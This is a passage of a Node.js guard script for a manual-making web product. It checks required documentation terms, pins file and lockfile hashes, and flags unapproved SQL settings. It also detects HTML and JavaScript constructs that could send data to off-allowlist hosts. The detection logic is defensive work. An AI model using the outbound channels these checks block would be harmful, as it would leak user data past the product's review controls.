import { readFile, readdir } from "node:fs/promises";
import { createHash } from "node:crypto";
import { parse } from "parse5";

const requiredDocs = {
  "README.md": [
    "Cloudflare R2を第一候補",
    "Stripe Checkout Sessions / Link / Webhook"
  ],
  "docs/01-product/pricing-and-plans.md": [
    "550円 / 1マニュアル",
    "3,300円 / 月",
    "9,900円 / 月",
    "`single_export`",
    "`personal_monthly`",
    "`team_monthly`",
    "Stripe Link",
    "購入日から30日間",
    "上限超過による自動課金は行わず"
  ],
  "docs/08-operations/remaining-harness-plan.md": [
    "R2 Storageハーネス",
    "Staging/Production分離ハーネス",
    "Stripe課金ハーネス",
    "DB migration安全ハーネス",
    "Browser Run / Browser Sessionハーネス",
    "承認が必要な操作",
    "完了条件"
  ],
  "docs/08-operations/environments-and-delivery.md": [
    "GitHub Environment",
    "Cloudflare Worker",
    "Supabase project",
    "Stripe",
    "`main` マージ後の扱い",
    "現段階のproduction workflowはcheckで停止する"
  ],
  "docs/08-operations/stripe-billing-harness.md": [
    "`BILLING_FEATURE_ENABLED=false`",
    "550 JPY / one manual / tax included",
    "3,300 JPY / monthly / tax included",
    "9,900 JPY / monthly / tax included",
    "Stripe Checkout SessionsとLink",
    "client_reference_id",
    "raw body",
    "stripe_event_id",
    "順不同",
    "未払い",
    "解約",
    "返金",
    "席数",
    "flagに関係なく継続",
    "自動返金queue",
    "idempotency key",
    "PLAN_CHANGE_UNRESOLVED"
  ],
  "docs/08-operations/db-migration-safety-harness.md": [
    "適用前チェック",
    "RLS negative test",
    "production",
    "実DB接続、migration適用、Secret取得を行っていない"
  ],
  "docs/08-operations/browser-run-session-harness.md": [
    "Durable Object",
    "Live View URL",
    "SSRF",
    "actual peer",
    "fail closed",
    "WebSocket",
    "WebTransport/QUIC",
    "WebRTC",
    "application bytes",
    "capture.browserRun.egressVerified.enabled=false",
    "入力値",
    "スクリーンショット",
    "終了・失敗・期限切れ",
    "監査ログ",
    "provider保証の絶対失効",
    "未実証なら起動をfail closed",
    "closeの失敗・hangとWorker/DO再起動"
  ],
  "docs/08-operations/browser-run-egress-proof.md": [
    "guardrails.allowedDomains",
    "actual peer",
    "blocked_before_bytes",
    "disabled_before_attempt",
    "WebTransport/QUIC",
    "WebRTC ICE/STUN/TURN",
    "BROWSER_EGRESS_NOT_VERIFIED",
    "RUN_ISOLATED_STAGING_P0"
  ],
  "docs/08-operations/feature-flags.md": [
    "`capture.browserRun.egressVerified.enabled`",
    "AC-023",
    "owner明示承認が揃うまでAI用flagを登録しない"
  ],
  "docs/05-api/api-contracts.md": [
    "503 BROWSER_EGRESS_NOT_VERIFIED",
    "mobile preview session",
    "hostnameのallowlistや運営承認はこの拒否を迂回できず"
  ],
  "docs/01-product/requirements-traceability.md": [
    "| FR-007 | SCR-CAPTURE-START | capture session APIs | browser_sessions, capture_sessions | ADR-0002 | AC-020, AC-023, AC-025 |",
    "| FR-016 | SCR-MOBILE-PREVIEW | mobile preview session API | browser_sessions | ADR-0002 | AC-024, AC-025 |"
  ],
  "docs/07-quality/acceptance-catalog.md": [
    "| AC-020 | editorユーザーかつ `capture.browserRun.egressVerified.enabled=true`、P0検証済み |",
    "| AC-024 | editorユーザーかつegress P0検証未完了 |",
    "| AC-025 | Browser Runセッション稼働中 |"
  ],
  "docs/09-delivery/decision-log.md": [
    "DEC-032",
    "任意URL・承認済みhost・mobile previewを含む全Browser Run起動",
    "egress kill switchで既存Browserの全通信を即時遮断",
    "Live Viewを失効して再発行を拒否",
    "全sessionのclose完了まで再試行・監査"
  ],
  "docs/09-delivery/risk-register.md": [
    "RISK-018",
    "任意URL・承認済みhost・mobile previewを含む全Browser Runをfail closed"
  ],
  "docs/08-operations/environment-variables.md": [
    "`STRIPE_SECRET_KEY`",
    "`STRIPE_WEBHOOK_SECRET`",
    "`STRIPE_PRICE_SINGLE_EXPORT`",
    "`STRIPE_PRICE_PERSONAL_MONTHLY`",
    "`STRIPE_PRICE_TEAM_MONTHLY`",
    "`BILLING_FEATURE_ENABLED`"
  ],
  "docs/08-operations/r2-storage-harness.md": [
    "初回要求前に推測不能なoperation key",
    "active reserved bytes",
    "lease期限後にreconciliation",
    "結果不明再送",
    "予約枠の永久消費"
  ],
  "docs/03-architecture/integrations.md": [
    "`single_export`: 550 JPY",
    "`personal_monthly`: 3,300 JPY",
    "`team_monthly`: 9,900 JPY",
    "固定Payment Link URLはentitlement付与に使わない"
  ],
  "docs/01-product/requirements-traceability.md": [
    "AC-056, AC-057, AC-059, AC-062, AC-063",
    "AC-055, AC-058"
  ]
};

const forbiddenLegacyR2Names = [
  "meccha-manual-staging-capture-assets",
  "meccha-manual-staging-manual-assets",
  "meccha-manual-staging-exports",
  "meccha-manual-staging-avatars",
  "meccha-manual-production-capture-assets",
  "meccha-manual-production-manual-assets",
  "meccha-manual-production-exports",
  "meccha-manual-production-avatars"
];

const errors = [];
const contents = {};

for (const [file, terms] of Object.entries(requiredDocs)) {
  try {
    const content = await readFile(file, "utf8");
    contents[file] = content;
    for (const term of terms) {
      if (!content.includes(term)) {
        errors.push(`Missing harness term in ${file}: ${term}`);
      }
    }
  } catch {
    errors.push(`Missing harness document: ${file}`);
  }
}

const combined = Object.values(contents).join("\n");
if ((contents["docs/08-operations/feature-flags.md"] ?? "").includes("ai.assistiveGeneration.enabled")) {
  errors.push("AI feature flag must not be registered before owner approval.");
}
if ((contents["docs/08-operations/environment-variables.md"] ?? "").includes("| `AI_PROVIDER_API_KEY` |")) {
  errors.push("AI provider secret must not be registered before owner approval.");
}

async function listRuntimeFiles(root) {
  const entries = await readdir(root, { withFileTypes: true });
  const files = [];
  for (const entry of entries) {
    const path = `${root}/${entry.name}`;
    if (entry.isDirectory()) files.push(...await listRuntimeFiles(path));
    else if (entry.isFile()) files.push(path);
  }
  return files;
}

const runtimeFiles = [
  ...await listRuntimeFiles("apps"),
  ...await listRuntimeFiles("supabase"),
  "wrangler.jsonc",
  "wrangler.brand.jsonc",
  "package.json"
];
const runtimeTextFiles = runtimeFiles.filter((path) => /\.(?:[cm]?[jt]s|tsx?|jsonc?|html|css|sql)$/i.test(path) || /\/(?:_headers|_redirects)$/.test(path));
const runtimeManifestHash = createHash("sha256");
for (const path of [...runtimeFiles].sort()) {
  runtimeManifestHash.update(path);
  runtimeManifestHash.update("\0");
  runtimeManifestHash.update(await readFile(path));
  runtimeManifestHash.update("\0");
}
if (runtimeManifestHash.digest("hex") !== "f4b1ebf3da4414278d6819b5c1b9715a719161693072b69d962f3a9bfdb3b944") {
  errors.push("Product runtime manifest changed without explicit outbound-boundary allowlist review.");
}
const packageManifest = JSON.parse(await readFile("package.json", "utf8"));
const approvedDependencies = [];
const approvedDevDependencies = {
  "@cloudflare/workers-types": "5.20260812.1",
  "@playwright/test": "1.62.1",
  parse5: "^8.0.0",
  typescript: "7.0.2",
  wrangler: "4.121.0"
};
for (const [group, actual, approved] of [
  ["dependencies", Object.keys(packageManifest.dependencies ?? {}), approvedDependencies],
  ["devDependencies", Object.keys(packageManifest.devDependencies ?? {}), Object.keys(approvedDevDependencies)]
]) {
  const unexpected = actual.filter((name) => !approved.includes(name));
  if (unexpected.length > 0) errors.push(`Unapproved ${group} may introduce a product runtime boundary: ${unexpected.join(", ")}`);
}
for (const [name, spec] of Object.entries(approvedDevDependencies)) {
  if (packageManifest.devDependencies?.[name] !== spec) errors.push(`Approved dependency spec changed: ${name}`);
}
const packageLock = JSON.parse(await readFile("package-lock.json", "utf8"));
const packageLockSha256 = createHash("sha256").update(await readFile("package-lock.json")).digest("hex");
if (packageLockSha256 !== "d206407a8c85c247f9f6f1f97f677f32d082ad8a257e5650dc65f74755922196") {
  errors.push("package-lock.json dependency graph or resolution metadata changed without allowlist review.");
}
if (JSON.stringify(packageLock.packages?.[""]?.dependencies ?? {}) !== JSON.stringify(packageManifest.dependencies ?? {})) {
  errors.push("package-lock runtime dependencies differ from package.json.");
}
if (JSON.stringify(packageLock.packages?.[""]?.devDependencies ?? {}) !== JSON.stringify(packageManifest.devDependencies ?? {})) {
  errors.push("package-lock devDependencies differ from package.json.");
}
for (const [path, expectedSha256] of [
  ["wrangler.jsonc", "c01b26083f3fb121933095823d2b4f378b65f2f76920fce174aa28492d7f5879"],
  ["wrangler.brand.jsonc", "65d5a31659bab236cef7648da43b7fd4b1c41b08857040ef161e8f9f96d9a566"],
  ["apps/worker/src/index-phase2.ts", "5e5c8242320a761412b71c2b42fa5928924b283ce98ee66b39e79d66515b47a7"],
  ["apps/worker/src/index.ts", "5964d4395fcf2fb780e0ba8194113eb5a63b88e1c3d67e3534dc828d4b162a18"],
  ["apps/worker/src/manual-router.ts", "78c289e29ff38c8b4a3e7347e80f5579f15132a83ba116fc62f0654b7fe7ac1d"],
  ["apps/worker/src/app-assets.ts", "203486e44f7a4198b75af245f44319acd1bb40bfa4234820c57708c934f106cc"],
  ["apps/worker/src/server-config.ts", "e02c49a6d9b8a6a2441b1c53b64ff526e7bbd00be69b41e6f361f1124dba6c5d"]
]) {
  const actualSha256 = createHash("sha256").update(await readFile(path)).digest("hex");
  if (actualSha256 !== expectedSha256) errors.push(`${path} outbound boundary changed without explicit allowlist review.`);
}

function sqlDollarDelimiterAt(content, index) {
  return content.slice(index).match(/^\$(?:[A-Z_\u0080-\u{10FFFF}][A-Z0-9_\u0080-\u{10FFFF}]*)?\$/iu)?.[0];
}

function stripSqlComments(content) {
  let output = "";
  let blockDepth = 0;
  let quoted = null;
  let backslashEscapedQuote = false;
  let dollarQuote = null;
  for (let index = 0; index < content.length; index += 1) {
    const pair = content.slice(index, index + 2);
    if (blockDepth > 0) {
      if (pair === "/*") blockDepth += 1;
      else if (pair === "*/") blockDepth -= 1;
      if (pair === "/*" || pair === "*/") index += 1;
      continue;
    }
    if (dollarQuote) {
      if (content.startsWith(dollarQuote, index)) {
        output += dollarQuote;
        index += dollarQuote.length - 1;
        dollarQuote = null;
      } else output += content[index];
      continue;
    }
    if (quoted) {
      output += content[index];
      if (backslashEscapedQuote && content[index] === "\\" && index + 1 < content.length) {
        output += content[index + 1];
        index += 1;
        continue;
      }
      if (content[index] === quoted) {
        if (content[index + 1] === quoted) {
          output += content[index + 1];
          index += 1;
        } else {
          quoted = null;
          backslashEscapedQuote = false;
        }
      }
      continue;
    }
    if (pair === "/*") {
      output += " ";
      blockDepth += 1;
      index += 1;
      continue;
    }
    if (content[index] === "'" || content[index] === '"') {
      quoted = content[index];
      backslashEscapedQuote = content[index] === "'" && /[eE]/.test(content[index - 1] ?? "") && !/[a-z0-9_$]/i.test(content[index - 2] ?? "");
      output += content[index];
      continue;
    }
    if (content[index] === "$") {
      const delimiter = sqlDollarDelimiterAt(content, index);
      if (delimiter) {
        dollarQuote = delimiter;
        output += delimiter;
        index += delimiter.length - 1;
        continue;
      }
    }
    if (pair === "--") {
      const newline = content.indexOf("\n", index + 2);
      if (newline === -1) break;
      output += "\n";
      index = newline;
      continue;
    }
    output += content[index];
  }
  return output;
}

function sqlIdentifierTokens(content) {
  const tokens = [];
  let bodyDelimiter = null;
  let statementTokenStart = 0;
  const isExecutableBodyPrefix = (statementTokens, hasEscapePrefixToken = false) => {
    const prefix = hasEscapePrefixToken ? statementTokens.slice(0, -1) : statementTokens;
    const isDoBody = prefix[0] === "do" && (prefix.length === 1 || (prefix.length === 3 && prefix[1] === "language"));
    const isFunctionBody = prefix.at(-1) === "as" && prefix.some((token) => ["function", "procedure"].includes(token));
    return isDoBody || isFunctionBody;
  };
  for (let index = 0; index < content.length;) {
    if (content.startsWith("--", index)) {
      const newline = content.indexOf("\n", index + 2);
      index = newline === -1 ? content.length : newline + 1;
      continue;
    }
    if (content.startsWith("/*", index)) {
      let depth = 1;
      index += 2;
      while (index < content.length && depth > 0) {
        if (content.startsWith("/*", index)) { depth += 1; index += 2; }
        else if (content.startsWith("*/", index)) { depth -= 1; index += 2; }
        else index += 1;
      }
      continue;
    }
    if (content[index] === "'") {
      const backslashEscapes = /[eE]/.test(content[index - 1] ?? "") && !/[a-z0-9_$]/i.test(content[index - 2] ?? "");
      const hasEscapePrefixToken = backslashEscapes && tokens.at(-1) === "e";
      const statementTokens = tokens.slice(statementTokenStart);
      const bodyPrefix = hasEscapePrefixToken ? statementTokens.slice(0, -1) : statementTokens;
      const executableBody = isExecutableBodyPrefix(statementTokens, hasEscapePrefixToken);
      const isDoLanguageName = bodyPrefix.length === 2 && bodyPrefix[0] === "do" && bodyPrefix[1] === "language";
      if (hasEscapePrefixToken) tokens.pop();
      let value = "";
      index += 1;
      while (index < content.length) {
        if (backslashEscapes && content[index] === "\\" && index + 1 < content.length) { value += content[index + 1]; index += 2; }
        else if (content[index] === "'" && content[index + 1] === "'") { value += "'"; index += 2; }
        else if (content[index] === "'") { index += 1; break; }
        else { value += content[index]; index += 1; }
      }
      if (executableBody) tokens.push(...sqlIdentifierTokens(value));
      else if (isDoLanguageName) tokens.push(`language:${value.toLowerCase()}`);
      continue;
    }
    if (content[index] === "$") {
      const delimiter = sqlDollarDelimiterAt(content, index);
      if (delimiter) {
        const statementTokens = tokens.slice(statementTokenStart);
        if (!bodyDelimiter && statementTokens.length === 2 && statementTokens[0] === "do" && statementTokens[1] === "language") {
          const start = index + delimiter.length;
          const end = content.indexOf(delimiter, start);
          if (end === -1) break;
          tokens.push(`language:${content.slice(start, end).toLowerCase()}`);
          index = end + delimiter.length;
          continue;
        }
        if (bodyDelimiter === delimiter) {
          bodyDelimiter = null;
          index += delimiter.length;
        } else if (!bodyDelimiter && isExecutableBodyPrefix(tokens.slice(statementTokenStart))) {
          // The outer Function/DO body is executable PL/pgSQL.
          bodyDelimiter = delimiter;
          index += delimiter.length;
        } else {
          // Nested or ordinary dollar quotes are string literals.
          const end = content.indexOf(delimiter, index + delimiter.length);
          index = end === -1 ? content.length : end + delimiter.length;
        }
        continue;
      }
    }
    if (content[index] === '"') {
      let value = "";
      index += 1;
      while (index < content.length) {
        if (content[index] === '"' && content[index + 1] === '"') { value += '"'; index += 2; }
        else if (content[index] === '"') { index += 1; break; }
        else { value += content[index]; index += 1; }
      }
      tokens.push(`quoted:${value.toLowerCase()}`);
      continue;
    }
    const identifier = content.slice(index).match(/^[a-z_][a-z0-9_$]*/i)?.[0];
    if (identifier) {
      tokens.push(identifier.toLowerCase());
      index += identifier.length;
    } else {
      if (content[index] === ";") statementTokenStart = tokens.length;
      index += 1;
    }
  }
  return tokens;
}

function sqlStructuralTokens(content, expandExecutableBodies = true) {
  const tokens = [];
  let statementTokenStart = 0;
  const statementIdentifiers = () => tokens.slice(statementTokenStart)
    .filter((token) => token.type === "identifier")
    .map((token) => token.value);
  const isExecutableBodyPrefix = (identifiers, hasEscapePrefixToken = false) => {
    const prefix = hasEscapePrefixToken ? identifiers.slice(0, -1) : identifiers;
    const isDoBody = prefix[0] === "do" && (prefix.length === 1 || (prefix.length === 3 && prefix[1] === "language"));
    const isFunctionBody = prefix.at(-1) === "as" && prefix.some((token) => ["function", "procedure"].includes(token));
    return isDoBody || isFunctionBody;
  };
  for (let index = 0; index < content.length;) {
    if (content.startsWith("--", index)) {
      const newline = content.indexOf("\n", index + 2);
      index = newline === -1 ? content.length : newline + 1;
      continue;
    }
    if (content.startsWith("/*", index)) {
      let depth = 1;
      index += 2;
      while (index < content.length && depth > 0) {
        if (content.startsWith("/*", index)) { depth += 1; index += 2; }
        else if (content.startsWith("*/", index)) { depth -= 1; index += 2; }
        else index += 1;
      }
      continue;
    }
    if (content[index] === "'") {
      const backslashEscapes = /[eE]/.test(content[index - 1] ?? "") && !/[a-z0-9_$]/i.test(content[index - 2] ?? "");
      const identifiers = statementIdentifiers();
      const hasEscapePrefixToken = backslashEscapes && identifiers.at(-1) === "e";
      const bodyPrefix = hasEscapePrefixToken ? identifiers.slice(0, -1) : identifiers;
      const executableBody = isExecutableBodyPrefix(identifiers, hasEscapePrefixToken);
      const isDoLanguageName = bodyPrefix.length === 2 && bodyPrefix[0] === "do" && bodyPrefix[1] === "language";
      if (hasEscapePrefixToken && tokens.at(-1)?.type === "identifier" && tokens.at(-1)?.value === "e") tokens.pop();
      let value = "";
      index += 1;
      while (index < content.length) {
        if (backslashEscapes && content[index] === "\\" && index + 1 < content.length) { value += content[index + 1]; index += 2; }
        else if (content[index] === "'" && content[index + 1] === "'") { value += "'"; index += 2; }
        else if (content[index] === "'") { index += 1; break; }
        else { value += content[index]; index += 1; }
      }
      if (executableBody && expandExecutableBodies) tokens.push(...sqlStructuralTokens(value));
      else if (isDoLanguageName) tokens.push({ type: "identifier", value: `language:${value.toLowerCase()}` });
      else tokens.push({ type: "string", value });
      continue;
    }
    if (content[index] === "$") {
      const delimiter = sqlDollarDelimiterAt(content, index);
      if (delimiter) {
        const start = index + delimiter.length;
        const end = content.indexOf(delimiter, start);
        if (end === -1) break;
        const value = content.slice(start, end);
        const identifiers = statementIdentifiers();
        const isDoLanguageName = identifiers.length === 2 && identifiers[0] === "do" && identifiers[1] === "language";
        if (isExecutableBodyPrefix(identifiers) && expandExecutableBodies) tokens.push(...sqlStructuralTokens(value));
        else if (isDoLanguageName) tokens.push({ type: "identifier", value: `language:${value.toLowerCase()}` });
        else tokens.push({ type: "string", value });
        index = end + delimiter.length;
        continue;
      }
    }
    if (content[index] === '"') {
      let value = "";
      index += 1;
      while (index < content.length) {
        if (content[index] === '"' && content[index + 1] === '"') { value += '"'; index += 2; }
        else if (content[index] === '"') { index += 1; break; }
        else { value += content[index]; index += 1; }
      }
      tokens.push({ type: "identifier", value: `quoted:${value.toLowerCase()}` });
      continue;
    }
    const identifier = content.slice(index).match(/^[a-z_][a-z0-9_$]*/i)?.[0];
    if (identifier) {
      tokens.push({ type: "identifier", value: identifier.toLowerCase() });
      index += identifier.length;
      continue;
    }
    if ("(),.;".includes(content[index])) {
      tokens.push({ type: "symbol", value: content[index] });
      if (content[index] === ";") statementTokenStart = tokens.length;
    } else if (!/\s/.test(content[index])) {
      tokens.push({ type: "operator", value: content[index] });
    }
    index += 1;
  }
  return tokens;
}

function hasUnapprovedSqlSetConfigCall(content) {
  const tokens = sqlStructuralTokens(content);
  const setConfigIndexes = tokens
    .map((token, index) => ({ token, index }))
    .filter(({ token }) => token.type === "identifier" && ["set_config", "quoted:set_config"].includes(token.value));
  return setConfigIndexes.some(({ token, index }) => {
    const call = tokens.slice(index, index + 9);
    const isApproved = token.value === "set_config"
      && tokens[index - 1]?.value !== "."
      && call[1]?.type === "symbol" && call[1]?.value === "("
      && call[2]?.type === "string" && call[2]?.value === "app.manual_publish_context"
      && call[3]?.type === "symbol" && call[3]?.value === ","
      && call[4]?.type === "string" && call[4]?.value === "on"
      && call[5]?.type === "symbol" && call[5]?.value === ","
      && call[6]?.type === "identifier" && call[6]?.value === "true"
      && call[7]?.type === "symbol" && call[7]?.value === ")";
    return !isApproved;
  });
}

function hasSqlFalseGucSetting(content) {
  const explicitTrueValues = new Set(["on", "true", "yes", "1"]);
  const statements = [];
  let statement = [];
  for (const token of sqlStructuralTokens(content)) {
    if (token.type === "symbol" && token.value === ";") {
      statements.push(statement);
      statement = [];
    } else statement.push(token);
  }
  statements.push(statement);
  return statements.some((tokens) => tokens.some((token, index) => {
    if (token.type !== "identifier" || !["standard_conforming_strings", "quoted:standard_conforming_strings"].includes(token.value)) return false;
    const identifiersBefore = tokens.slice(0, index).filter((candidate) => candidate.type === "identifier").map((candidate) => candidate.value);
    const isSetStatement = identifiersBefore.includes("set");
    const isAlterStatement = identifiersBefore[0] === "alter"
      && ["role", "user", "database", "system"].includes(identifiersBefore[1])
      && identifiersBefore.includes("set");
    if (!isSetStatement && !isAlterStatement) return false;
    const separator = tokens[index + 1];
    const assignedValues = tokens.slice(index + 2);
    const value = assignedValues[0];
    const hasAssignment = (separator?.type === "operator" && separator.value === "=")
      || (separator?.type === "identifier" && separator.value === "to");
    if (!hasAssignment || !value) return true;
    const isSingleLiteralValue = assignedValues.length === 1
      && (value.type === "identifier" || value.type === "string" || value.type === "operator");
    return !isSingleLiteralValue || !explicitTrueValues.has(value.value.toLowerCase());
  }));
}

function hasUnapprovedHtmlEgress(content, approvedHosts) {
  const activeTags = new Set(["script", "form", "iframe", "frame", "audio", "video", "source", "track", "object", "embed", "base", "style"]);
  const urlAttributes = new Set(["src", "href", "xlink:href", "action", "formaction", "poster", "data", "cite", "background"]);
  const deliveryOrigin = "https://www.meccha-iiyatsu.com";
  const isApprovedResource = (value) => {
    const candidate = value.trim();
    if (!candidate) return true;
    if (/^data:image\//i.test(candidate)) return true;
    try {
      const url = new URL(candidate, deliveryOrigin);
      return url.protocol === "https:" && approvedHosts.has(url.hostname.toLowerCase());
    } catch {
      return false;
    }
  };
  const resourceListIsApproved = (value) => value.split(",").every((entry) => isApprovedResource(entry.trim().split(/\s+/)[0] ?? ""));
  const spaceSeparatedResourceListIsApproved = (value) => value.trim().split(/\s+/).every((entry) => isApprovedResource(entry));
  let rejected = false;
  const visit = (node) => {
    if (rejected) return;
    const tagName = String(node.tagName ?? "").toLowerCase();
    const attributes = node.attrs ?? [];
    if (activeTags.has(tagName)) rejected = true;
    if (tagName === "meta" && attributes.some((attribute) => attribute.name.toLowerCase() === "http-equiv" && attribute.value.toLowerCase() === "refresh")) rejected = true;
    for (const attribute of attributes) {
      const name = attribute.name.toLowerCase();
      if (name.startsWith("on")) rejected = true;
      if (name === "style") rejected = true;
      if (urlAttributes.has(name) && !isApprovedResource(attribute.value)) rejected = true;
      if (["srcset", "imagesrcset"].includes(name) && !resourceListIsApproved(attribute.value)) rejected = true;
      if (name === "ping" && !spaceSeparatedResourceListIsApproved(attribute.value)) rejected = true;
    }
    for (const child of node.childNodes ?? []) visit(child);
  };
  visit(parse(content));
  return rejected;
}

function javascriptStructuralTokens(content) {
  const tokens = [];
  for (let index = 0; index < content.length;) {
    const character = content[index];
    const next = content[index + 1];
    if (/\s/.test(character)) { index += 1; continue; }
    if (character === "/" && next === "/") {
      index += 2;
      while (index < content.length && !/[\r\n\u2028\u2029]/.test(content[index])) index += 1;
      continue;
    }
    if (character === "/" && next === "*") {
      index += 2;
      while (index < content.length && !(content[index] === "*" && content[index + 1] === "/")) index += 1;
      index = Math.min(content.length, index + 2);
      continue;
    }
    if (["'", '"', "`"].includes(character)) {
      const quote = character;
      index += 1;
      while (index < content.length) {
        if (content[index] === "\\") { index += 2; continue; }
        if (content[index] === quote) { index += 1; break; }
        index += 1;
      }
      continue;
    }
    if (/[A-Za-z_$]/.test(character)) {
      let end = index + 1;
      while (end < content.length && /[\w$]/.test(content[end])) end += 1;
      tokens.push({ type: "identifier", value: content.slice(index, end) });
      index = end;
      continue;
    }
    if ("{}[]():=.,;?<>!".includes(character)) tokens.push({ type: "symbol", value: character });
    index += 1;
  }
  return tokens;
}

function hasComputedCapabilityBinding(content) {
  const tokens = javascriptStructuralTokens(content);
  for (let start = 0; start < tokens.length; start += 1) {
    if (tokens[start].value !== "{") continue;
    let braceDepth = 1;
    let computedBinding = false;
    let end = start + 1;
    for (; end < tokens.length && braceDepth > 0; end += 1) {
      const token = tokens[end];
      if (token.value === "{") { braceDepth += 1; continue; }
      if (token.value === "}") { braceDepth -= 1; continue; }
      if (token.value !== "[") continue;
      let bracketDepth = 1;
      let cursor = end + 1;
      for (; cursor < tokens.length && bracketDepth > 0; cursor += 1) {
        if (tokens[cursor].value === "[") bracketDepth += 1;
        else if (tokens[cursor].value === "]") bracketDepth -= 1;
      }
      if (bracketDepth === 0 && tokens[cursor]?.value === ":" && tokens[cursor + 1]?.type === "identifier") computedBinding = true;
      end = cursor - 1;
    }
    if (computedBinding && braceDepth === 0 && tokens[end]?.value === "=") return true;
  }
  return false;
}

function hasAliasedComputedCapabilityLookup(content) {
  const tokens = javascriptStructuralTokens(content);
  const closingToOpeningParenthesis = new Map();
  const parenthesisStack = [];
  for (let index = 0; index < tokens.length; index += 1) {
    if (tokens[index].value === "(") parenthesisStack.push(index);
    else if (tokens[index].value === ")" && parenthesisStack.length > 0) {
      closingToOpeningParenthesis.set(index, parenthesisStack.pop());
    }
  }
  const isGroupingOpening = (opening) => {
    const previous = tokens[opening - 1];
    const prefixKeywords = new Set(["await", "yield", "return", "throw", "typeof", "void", "delete"]);
    return (previous?.type !== "identifier" || prefixKeywords.has(previous.value))
      && ![")", "]", "."].includes(previous?.value);
  };
  const capabilityAliases = new Set(["navigator", "Navigator", "self", "window", "globalThis"]);
  const capabilityMethodAliases = new Set();
  const expressionReferencesCapability = (start, endExclusive = tokens.length) => {
    let parentheses = 0;
    let brackets = 0;
    let braces = 0;
    for (let cursor = start; cursor < endExclusive; cursor += 1) {
      const token = tokens[cursor];
      if (token.value === "(") parentheses += 1;
      else if (token.value === ")") parentheses = Math.max(0, parentheses - 1);
      else if (token.value === "[") brackets += 1;
      else if (token.value === "]") brackets = Math.max(0, brackets - 1);
      else if (token.value === "{") braces += 1;
      else if (token.value === "}") {
        if (parentheses === 0 && brackets === 0 && braces === 0) break;
        braces = Math.max(0, braces - 1);
      }
      if (parentheses === 0 && brackets === 0 && braces === 0 && [",", ";"].includes(token.value)) break;
      if (token.type === "identifier" && capabilityAliases.has(token.value)) return true;
    }
    return false;
  };
  const expressionCallsCapabilityMethod = (start, endExclusive = tokens.length) => {
    for (let cursor = start; cursor < endExclusive; cursor += 1) {
      if (tokens[cursor].type === "identifier" && capabilityMethodAliases.has(tokens[cursor].value)
        && tokens[cursor - 1]?.value === ".") {
        let callStart = cursor + 1;
        while (tokens[callStart]?.value === "!") callStart += 1;
        if (!["(", "?"].includes(tokens[callStart]?.value)) {
          let opening = null;
          let depth = 0;
          for (let index = cursor - 1; index >= start; index -= 1) {
            if (tokens[index].value === ")") depth += 1;
            else if (tokens[index].value === "(" && depth > 0) depth -= 1;
            else if (tokens[index].value === "(") { opening = index; break; }
          }
          if (opening !== null && isGroupingOpening(opening)) {
            let closingDepth = 1;
            let closing = opening + 1;
            for (; closing < endExclusive && closingDepth > 0; closing += 1) {
              if (tokens[closing].value === "(") closingDepth += 1;
              else if (tokens[closing].value === ")") closingDepth -= 1;
            }
            if (closingDepth === 0 && closing > cursor) {
              callStart = closing;
              let normalizing = true;
              while (normalizing) {
                normalizing = false;
                while (tokens[callStart]?.value === "!") { callStart += 1; normalizing = true; }
                if (tokens[callStart]?.value === "as") {
                  callStart += 1;
                  while (callStart < endExclusive && !(tokens[callStart]?.value === ")"
                    && closingToOpeningParenthesis.get(callStart) < cursor)) callStart += 1;
                  normalizing = true;
                }
                if (tokens[callStart]?.value === ")") {
                  const matchedOpening = closingToOpeningParenthesis.get(callStart);
                  if (matchedOpening !== undefined && isGroupingOpening(matchedOpening)) {
                    callStart += 1;
                    normalizing = true;
                  }
                }
              }
            }
          }
        }
        if (tokens[callStart]?.value === "(" || (tokens[callStart]?.value === "?"
          && tokens[callStart + 1]?.value === "." && tokens[callStart + 2]?.value === "(")) return true;
      }
      if ([",", ";"].includes(tokens[cursor].value)) break;
    }
    return false;
  };
  const bindingPattern = (start) => {
    const opening = tokens[start]?.value;
    if (!["[", "{"].includes(opening)) return null;
    const stack = [opening];
    const pairs = { "]": "[", "}": "{" };
    let end = start + 1;
    for (; end < tokens.length && stack.length > 0; end += 1) {
      const value = tokens[end].value;
      if (["[", "{"].includes(value)) stack.push(value);
      else if (["]", "}"].includes(value)) {
        if (stack.at(-1) !== pairs[value]) return null;
        stack.pop();
      }
    }
    if (stack.length > 0 || tokens[end]?.value !== "=" || tokens[end + 1]?.value === "=") return null;
    const names = tokens.slice(start + 1, end - 1)
      .filter((token) => token.type === "identifier" && !["const", "let", "var"].includes(token.value))
      .map((token) => token.value);
    return { end, names };
  };
  const afterMatching = (start, opening, closing, limit = tokens.length) => {
    if (tokens[start]?.value !== opening) return null;
    let depth = 1;
    let cursor = start + 1;
    for (; cursor < limit && depth > 0; cursor += 1) {
      if (tokens[cursor].value === opening) depth += 1;
      else if (tokens[cursor].value === closing) depth -= 1;
    }
    return depth === 0 ? cursor : null;
  };
  const afterBody = (bodyStart, limit = tokens.length) => afterMatching(bodyStart, "{", "}", limit);
  const enclosingBraceStart = (cursor) => {
    let depth = 0;
    for (let index = cursor - 1; index >= 0; index -= 1) {
      if (tokens[index].value === "}") { depth += 1; continue; }
      if (tokens[index].value !== "{") continue;
      if (depth > 0) { depth -= 1; continue; }
      return index;
    }
    return null;
  };
  const isObjectOrClassBody = (cursor) => {
    const opening = enclosingBraceStart(cursor);
    if (opening === null) return false;
    if (["=", "(", "[", ",", "return"].includes(tokens[opening - 1]?.value)) return true;
    if (tokens[opening - 1]?.value === ":") {
      let nestedColons = 0;
      for (let index = opening - 2; index >= 0 && ![";", "{", "}"].includes(tokens[index].value); index -= 1) {
        if (tokens[index].value === ":") nestedColons += 1;
        else if (tokens[index].value === "?" && tokens[index + 1]?.value !== "." && tokens[index + 1]?.value !== "?"
          && tokens[index - 1]?.value !== "?" && nestedColons === 0) return true;
        else if (tokens[index].value === "?" && tokens[index + 1]?.value !== "." && tokens[index + 1]?.value !== "?"
          && tokens[index - 1]?.value !== "?") nestedColons -= 1;
      }
      return isObjectOrClassBody(opening - 1);
    }
    for (let index = opening - 1; index >= 0 && ![";", "{", "}"].includes(tokens[index].value); index -= 1) {
      if (tokens[index].value === "class") return true;
    }
    return false;
  };
  let changed = true;
  while (changed) {
    changed = false;
    for (let index = 0; index < tokens.length - 2; index += 1) {
      if (tokens[index].value !== "function" || tokens[index + 1]?.type !== "identifier") continue;
      const functionName = tokens[index + 1].value;
      let paramsStart = index + 2;
      while (paramsStart < tokens.length && tokens[paramsStart].value !== "(") paramsStart += 1;
      if (paramsStart >= tokens.length) continue;
      let parentheses = 1;
      let afterParams = paramsStart + 1;
      for (; afterParams < tokens.length && parentheses > 0; afterParams += 1) {
